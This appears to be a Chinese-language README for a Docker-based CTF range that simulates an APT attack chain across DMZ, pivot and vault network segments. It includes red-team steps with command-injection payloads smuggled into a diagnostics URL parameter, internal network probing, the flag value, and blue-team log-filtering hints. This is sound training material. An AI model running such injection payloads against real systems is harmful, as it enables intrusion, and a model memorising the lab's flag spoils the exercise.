# 🏰 APT 跨網段全鏈條奪旗靶場 (APT Cross-Domain CTF Range)

> **對接手冊**:
> - [28.1 端到端 APT 攻擊鏈奪旗實戰：從邊界突破到核心資料庫竊取](../../28.1_end_to_end_apt_attack_chain_ctf.md)
> - [28.3 多主機橫向移動日誌關聯與攻擊路徑歸因](../../28.3_multi_host_lateral_movement_attribution.md)

---

## 🎯 靶場網路拓撲與架構

```
[外部網際網路 (Internet)]
        |
        v (Port 8080)
+-------------------------------+
|  dmz-web (172.30.1.10)        | <-- DMZ 邊界區 (包含 RCE 診斷端點)
|  雙網卡: 172.30.1.10 / .2.10   |
+-------------------------------+
        |  [internal-net: 172.30.2.0/24]
        v
+-------------------------------+
|  internal-pivot (172.30.2.20) | <-- 內部隔離區 (企業內部維運跳板機)
|  雙網卡: 172.30.2.20 / .3.20   |
+-------------------------------+
        |  [vault-net: 172.30.3.0/24]
        v
+-------------------------------+
|  vault-db (172.30.3.30:9999)  | <-- 核心機密區 (終極資料庫與 Flag)
+-------------------------------+
```

---

## 🚀 快速啟動

```bash
# 1. 建立並啟動三層網段靶機群
docker compose up -d --build

# 2. 檢驗容器運行狀況
docker compose ps
```

---

## ⚔️ 紅隊攻破攻擊鏈路徑

1. **初始立足點 (Initial Access)**:
   - 瀏覽器造訪 `http://localhost:8080`。
   - 漏洞端點: `http://localhost:8080/api/v1/admin/diagnostics?host=127.0.0.1;id;whoami`。
2. **內網探測與橫向移動 (Lateral Movement)**:
   - 透過 WebShell 向內網段發動探測:
     `curl "http://localhost:8080/api/v1/admin/diagnostics?host=127.0.0.1;ping+-c+1+172.30.2.20"`
3. **終極奪旗 (Exfiltration)**:
   - 橫向滲透進入 `internal-pivot` 主機後，連線核心資產庫:
     `curl http://172.30.3.30:9999/flag.txt`
   - 捕獲旗標: `FLAG{apt_full_chain_pwned_7721_v4ult}`。

---

## 🛡️ 藍隊鑑識與威脅獵捕指引

- **Web 伺服器存取紀錄分析**:
  - 檢視 `dmz-web` 日誌，過濾特殊字元 `;`, `|`, `&&`, `%20`。
- **網路跨網段連線告警**:
  - 檢驗是否有來自 `172.30.2.0/24` 異常直通 `172.30.3.30:9999` 的未授權流量。
